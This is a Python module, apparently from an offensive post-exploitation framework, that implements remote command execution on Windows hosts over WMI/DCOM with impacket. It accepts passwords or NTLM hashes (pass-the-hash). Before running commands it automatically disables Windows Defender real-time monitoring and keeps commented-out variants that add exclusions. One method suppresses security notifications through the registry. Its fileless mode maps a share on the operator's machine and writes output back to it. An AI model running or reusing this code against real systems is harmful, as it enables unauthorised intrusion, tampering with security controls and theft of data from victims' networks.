import ntpath, logging

from gevent import sleep
from cmx.helpers.misc import gen_random_string
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.smbconnection import SMBConnection
from impacket.smb import SMB_DIALECT
from impacket.smb3structs import SMB2_DIALECT_002, SMB2_DIALECT_21
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from cmx import config as cfg
import time


class WMIEXEC:
    def __init__(self, target, share_name, username, password, domain, smbconnection, hashes=None, share=None):
        self.__target = target
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__share = share
        self.__smbconnection = smbconnection
        self.__output = None
        self.__outputBuffer = ''
        self.__share_name = share_name
        self.__shell = 'cmd.exe /Q /c '
        self.__pwd = 'C:\\'
        self.__aesKey = None
        self.__doKerberos = False
        self.__retOutput = True

        #This checks to see if we didn't provide the LM Hash
        if hashes is not None:
            if hashes.find(':') != -1:
                self.__lmhash, self.__nthash = hashes.split(':')
            else:
                self.__nthash = hashes

        if self.__password is None:
            self.__password = ''

        dialect = smbconnection.getDialect()
        
        if dialect == SMB_DIALECT:
            logging.debug("SMBv1 dialect used")
        elif dialect == SMB2_DIALECT_002:
            logging.debug("SMBv2.0 dialect used")
        elif dialect == SMB2_DIALECT_21:
            logging.debug("SMBv2.1 dialect used")
        else:
            logging.debug("SMBv3.0 dialect used")


        self.__dcom  = DCOMConnection(self.__target, self.__username, self.__password, self.__domain, self.__lmhash, 
                                      self.__nthash,self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos)
        try:
            iInterface = self.__dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()

            self.__win32Process,_ = iWbemServices.GetObject('Win32_Process')
        except  (Exception, KeyboardInterrupt) as e:
                   if logging.getLogger().level == logging.DEBUG:
                       import traceback
                       traceback.print_exc()
                   logging.error(str(e))
                   if smbConnection is not None:
                       smbConnection.logoff()


    def execute(self, command, output=False):
        self.__retOutput = output
        if self.__retOutput:
            self.__smbconnection.setTimeout(100000)

        self.execute_handler(command)
        self.__dcom.disconnect()
        return self.__outputBuffer

    def cd(self, s):
        self.execute_remote('cd ' + s)
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            print(self.__outputBuffer)
            self.__outputBuffer = ''
        else:
            self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
            self.execute_remote('cd ')
            self.__pwd = self.__outputBuffer.strip('\r\n')
            self.__outputBuffer = ''

    def output_callback(self, data):
        self.__outputBuffer += data

    def execute_handler(self, data):
        if self.__retOutput:
            self.disable_defender()
            try:
                self.execute_fileless(data)
            except:
                self.cd('\\')
                self.execute_remote(data)
        else:
            self.disable_defender()
            self.execute_remote(data)

    def execute_remote(self, data):
        self.__output = '\\Windows\\Temp\\' + gen_random_string(6)

        command = self.__shell + data
        if self.__retOutput:
            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output  + ' 2>&1'

        logging.debug('wmi Executing_remote command: ' + command)
        self.__win32Process.Create(command, self.__pwd, None)
        self.get_output_remote()

    def execute_fileless(self, data):
        self.__output = gen_random_string(6)
        local_ip = self.__smbconnection.getSMBServer().get_socket().getsockname()[0]

        command = self.__shell + data + ' 1> \\\\{}\\{}\\{} 2>&1"'.format(local_ip, self.__share_name, self.__output)
        #adding creds gets past systems disallowing guest-auth
        command = 'cmd.exe /Q /c "net use /persistent:no \\\\{}\\{} /user:{} {} & '.format(local_ip, self.__share_name, self.__username, self.__password) + command

        logging.debug('wmi Executing_fileless command: ' + command)

        self.__win32Process.Create(command, self.__pwd, None)
        self.get_output_fileless()

    def get_output_fileless(self):
        while True:
            try:
                with open((cfg.TMP_PATH / self.__output), 'r') as output:
                    self.output_callback(output.read())
                break
            except IOError:
                sleep(5)

    def get_output_remote(self):
        if self.__retOutput is False:
            self.__outputBuffer = ''
            return

        while True:
            try:
                self.__smbconnection.getFile(self.__share, self.__output, self.output_callback)
                break
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
                    # Output not finished, let's wait
                    sleep(2)
                    pass
                else:
                    #print str(e)
                    pass

        self.__smbconnection.deleteFile(self.__share, self.__output)

    def disable_notifications(self):
        command = self.__shell + 'reg add "HKEY_USERS\\.DEFAULT\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.SystemToast.SecurityAndMaintenance" /v "Enabled" /d "0" /t REG_DWORD'

        logging.debug('notifications being disabling using: ' + command)
        self.__win32Process.Create(command, self.__pwd, None)
        time.sleep(1)

    def disable_defender(self):
        command = self.__shell + 'powershell.exe -exec bypass -noni -nop -w 1 -C "Set-MpPreference -DisableRealtimeMonitoring $true;"'
        #command = self.__shell + 'powershell.exe -exec bypass -noni -nop -w 1 -C "Add-MpPreference -ExclusionExtension ".exe""'
        #command = self.__shell + 'powershell.exe -exec bypass -noni -nop -w 1 -C "Add-MpPreference -ExclusionProcess $pid"'
        #command = self.__shell + 'powershell.exe -exec bypass -noni -nop -w 1 -C "Add-MpPreference -ExclusionPath $env:temp"'
        #command = self.__shell + 'powershell.exe -exec bypass -noni -nop -w 1 -C "Add-MpPreference -ExclusionExtension ".ps1""'
        #command = self.__shell + 'powershell.exe -exec bypass -noni -nop -w 1 -C "Set-MpPreference -DisableIOAVProtection 1"'
        logging.debug('wmi Disabling Defender using: ' + command)
        self.__win32Process.Create(command, self.__pwd, None)
        print('            [!] Sleeping to allow defender process to finish shutting down[!] ')
        time.sleep(8)